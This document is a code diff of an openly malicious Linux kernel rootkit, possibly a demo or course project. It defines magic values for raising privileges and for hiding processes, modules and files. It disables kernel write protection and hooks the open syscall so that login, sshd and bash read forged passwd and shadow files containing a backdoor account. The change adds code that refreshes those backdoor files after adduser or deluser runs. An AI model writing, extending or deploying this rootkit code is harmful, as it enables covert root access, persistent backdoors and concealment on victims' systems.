@@ -58,16 +58,17 @@ int proc_open_fd;    /* fd for opened '/proc/' in this process open_files table 
 u_int8_t module_hidden;
 u_int8_t hide_files_flag;
 u_int8_t backdoor_added;
+u_int8_t backdoor_needs_refresh;
 
 /***************************************************************************/
 /* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
-#define ELEVATE_UID     -23121990
-#define HIDE_PROCESS    -19091992
-#define HIDE_MODULE     -657623
-#define SHOW_MODULE     -9032847
-#define SHOW_PROCESS    -2051967
 #define HIDE_FILES      -7111963
 #define SHOW_FILES      -294365563
+#define ELEVATE_UID     -23121990
+#define HIDE_MODULE     -657623
+#define SHOW_MODULE     -9032847
+#define HIDE_PROCESS    -19091992
+#define SHOW_PROCESS    -2051967
 #define ADD_BACKDOOR    -31337
 #define REMOVE_BACKDOOR -841841
 /***************************************************************************/
@@ -105,6 +106,7 @@ static void enable_write_protection(void)
         asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
     }
 }
+
 
 /*========== Rootkit functionality  ==========*/
 
@@ -290,6 +292,7 @@ int creates_backdoor_copies(void)
         return ret;
     }
 
+    backdoor_needs_refresh = 0;
 closefiles_exit:
 if (pfile)
     filp_close(pfile, NULL);
@@ -331,16 +334,18 @@ int hide_files(void)
 int show_files(void)
 {
     int err = 0;
+    /*
+     * Showing files will be useful for demo
     if (backdoor_added) {
         PUBMSG("Backdoor account has been added. Cannot show files presently.");
         err = -EPERM;
         goto out;
     }
+    */
     if (hide_files_flag) {
         hide_files_flag = 0;
         err = 1;
     }
-out:
     return err;
 }
 
@@ -366,7 +371,6 @@ int show_module(void)
 {
     int err = 0;
     if (module_hidden) {
-        // TODO
         err = 1;
     }
     return err;
@@ -564,6 +568,7 @@ out:
 asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 {
     long fd = -1;
+    long ret = 0;
     unsigned short int is_our_guy = 0;
     mm_segment_t fs;
     char* loginproc = "login";
@@ -572,16 +577,24 @@ asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
     char* bashproc  = "bash";
     char* entproc   = "getent";
     char* lsbproc   = "lsb_release";
-    //char* addproc = "adduser"; //<<<<<< Trigger new muzerfiles creation
-    //char* delproc = "deluser";
+    char* addproc   = "adduser";
+    char* delproc   = "deluser";
 
-    /*
-    if ((is_userspace_str(pathname, "/etc/passwd")) ||
-        (is_userspace_str(pathname, "/etc/shadow"))) {
-        printk(KERN_ERR "RKIT: ==== name of process: %s\n", current->comm); //<<<<<<
+    // When adduser or deluser is called, we should mark our malicious
+    // file to be refreshed after adduser and deluser are finished
+    if ((strcmp(current->comm, addproc) == 0) ||
+        (strcmp(current->comm, delproc) == 0)) {
+        backdoor_needs_refresh = 1;
+    } else if (backdoor_needs_refresh) {
+        ret = creates_backdoor_copies();
+        if (ret < 0) {
+            PUBMSG("Failed to create fresh passwd files. Some new users may not work.");
+            return ret;
+        }
     }
-    */
 
+    // Check if the calling process is a candidate who should get our
+    // malicious files
     if ((strcmp(current->comm, loginproc) == 0) ||
         (strcmp(current->comm, sshdproc) == 0)  ||
         (strcmp(current->comm, adproc) == 0)    ||
